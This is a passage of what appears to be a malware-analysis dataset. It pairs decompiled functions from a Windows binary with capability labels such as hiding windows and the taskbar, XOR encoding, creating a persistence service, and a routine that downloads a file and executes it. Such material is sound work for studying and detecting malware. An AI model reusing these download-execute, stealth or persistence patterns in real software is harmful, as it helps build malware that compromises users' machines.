        "decompiled_code": "\nvoid fcn.004487a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44883a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x493644) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.004485d0();\n    if (cVar1 == '\\0') {\n        fcn.00407550();\n        fcn.0040db04();\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.004489d0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x448841);\n    return;\n}\n",
        "token_count": 336
    },
    "0044a98c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a98c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00452f8c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452f8c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x453029;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00419f40();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.0044a850();\n        fcn.0044a98c();\n        fcn.00450830();\n        fcn.0044a6e8();\n        fcn.0044aaac();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x453030;\n    uStack28 = 0x453028;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 291
    },
    "0041fe9c": {
        "rules": [
            "resume thread"
        ],
        "decompiled_code": "\nvoid fcn.0041fe9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_ResumeThread(*(in_EAX + 4));\n    fcn.0041fbac();\n    if (iVar1 == 1) {\n        *(in_EAX + 0xe) = 0;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00423954": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.00423954(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "004473cc": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004473cc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00458594();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.00447208();\n                }\n                else {\n                    uVar2 = fcn.00458594(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.00450750();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0046db6c": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046db6c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dba0, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dbb0, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dbc0, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 121
    },
    "0046dbd0": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dbd0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dc04, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dc14, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dc24, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 120
    },
    "0046dc34": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dc34(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dc58, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dc68, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "0046dc78": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dc78(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dc9c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dcac, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 90
    },
    "0046dcbc": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dcbc(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dce0, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dcf0, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "0046dd00": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dd00(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dd24, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dd34, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 89
    },
    "0046dd44": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dd44(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x46dd60, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "0046dd68": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dd68(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x46dd84, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 66
    },
    "00471194": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.00471194(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4711ac, 0, 5);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 58
    },
    "004711bc": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.004711bc(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4711d4, 0, 0);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 59
    },
    "00475bd4": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.00475bd4\n noreturn \n          (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint uStack40;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    iVar3 = 6;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puStack32 = 0x475bf8;\n    fcn.00405fe8();\n    var_20h = 0x475d40;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_2ch = 0x475ce1;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00475bd4::var_30h;\n    puStack32 = &stack0xfffffffc;\n    fcn.00408568();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    uVar1 = fcn.004059dc(0, 0);\n    uVar2 = fcn.004059dc(uVar1);\n    iVar3 = sub.URLMON.DLL_URLDownloadToFileA(0, uVar2);\n    uVar4 = iVar3 == 0;\n    if (uVar4) {\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    else {\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00409b84();\n    fcn.00405974();\n    if (uVar4) {\n        sub.shell32.dll_ShellExecuteA(0, 0x475d90, uVar1, 0, 0, 5);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 534
    },
    "00489544": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00489544(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 0) {\n        sub.shell32.dll_ShellExecuteA(0, 0x48959c, 0x489594, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 1) {\n        sub.shell32.dll_ShellExecuteA(0, 0x48959c, 0x4895a4, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 3) {\n        fcn.00461ba4();\n        return;\n    }\n    if (in_EAX == 4) {\n        fcn.00461bdc();\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "0047196c": {
        "rules": [
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c"
        ],
        "decompiled_code": "\nvoid fcn.0047196c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t iStack132;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x471990;\n    fcn.004059cc();\n    uStack52 = 0x471a92;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack60 = 0xf003f;\n    uStack64 = 0;\n    uStack68 = 0;\n    puStack72 = 0x4719b1;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA();\n    if (iVar1 != 0) {\n        uStack76 = 0x471a57;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.004059dc(0, 0, 0, 0, 0);\n        uVar2 = sub.advapi32.dll_CreateServiceA();\n        fcn.00405728();\n        arg_8h = 0;\n        fcn.00405728();\n        fcn.00405864();\n        fcn.004059dc();\n        fcn.00405728();\n        fcn.00471304(arg_8h);\n        sub.advapi32.dll_CloseServiceHandle(uVar2);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = iVar1;\n        iStack132 = iVar1;\n    }\n    *in_FS_OFFSET = iStack132;\n    fcn.00405554(0x471a99);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 507
    },
    "00472a40": {
        "rules": [
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472a40(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x472a52;\n    fcn.004059cc();\n    uStack20 = 0x472a85;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(param_2);\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x472a8c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 188
    },
    "00404100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404100(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 176
    },
    "004046b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004046b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.004060ac();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 95
    },
    "00404800": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00404800(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x496008 != NULL) {\n                    (**0x496008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040487c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040487c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00405110": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405110(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4987d4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4987d0 != 0) {\n        iVar1 = *(*0x4987d0 + 4);\n        uStack24 = 0x405159;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4987d4 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00405174": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405174(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4987d0 != NULL) {\n        iVar1 = **0x4987d0;\n        iVar4 = 0;\n        iVar2 = (*0x4987d0)[1];\n        uStack28 = 0x4051c1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4987d4 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00405cd8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405cd8(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar3 = 0;\n    if (param_2 != NULL) {\n        iVar3 = *(param_2 + -4);\n    }\n    iVar2 = fcn.00404030();\n    if ((*(iVar2 + 4) == -0x284e) || (cVar1 = fcn.00403f98(iVar3, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar5 = *(iVar2 + 0x14) + *(iVar2 + 0xc);\n            iVar4 = *(iVar2 + 8) - *(iVar2 + 0xc);\n            if (iVar3 < iVar4) break;\n            *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar4;\n            iVar3 = iVar3 - iVar4;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *param_2;\n                param_2 = param_2 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            iVar4 = (**(iVar2 + 0x1c))();\n            if (iVar4 != 0) {\n                fcn.0040307c();\n                return iVar2;\n            }\n        }\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *param_2;\n            param_2 = param_2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 427
    },
    "004061e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n// WARNING: Removing unreachable block (ram,0x00406166)\n// WARNING: Removing unreachable block (ram,0x0040614c)\n\nvoid __fastcall fcn.004061e4(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.00405530();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405d28();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004060e0();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.004060f8();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.004060ac();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.0040700c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x496008 != NULL) {\n                (**0x496008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406934();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "0040678c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.0040678c(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x496008 != NULL) {\n                    (**0x496008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00406a10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406a10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x492040;\n    if (*0x492040 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.004069c8();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "00406a48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00406a48(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 62
    },
    "00406ecc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406ecc(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x492044 == NULL) || ((*0x492044)[1] != in_EAX)) {\n        ppiVar2 = *0x492044;\n        if (*0x492044 != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402f1c();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x492044 = **0x492044;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00406f9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406f9c(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x407000;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.00406f30();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x492040;\n    if (var_4h == *0x492040) {\n        *0x492040 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00409bd8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409bd8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405ec8();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -2 + iVar2 * 2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00405d28();\n    }\n    else {\n        for (; *(in_EAX + -2 + iVar1 * 2) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00405f58(param_2);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0040aa04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040aa04(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x0040aa1d:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x0040aa1d;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 505
    },
    "0040aa48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa48(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 89
    },
    "0040aa5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa5c(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n           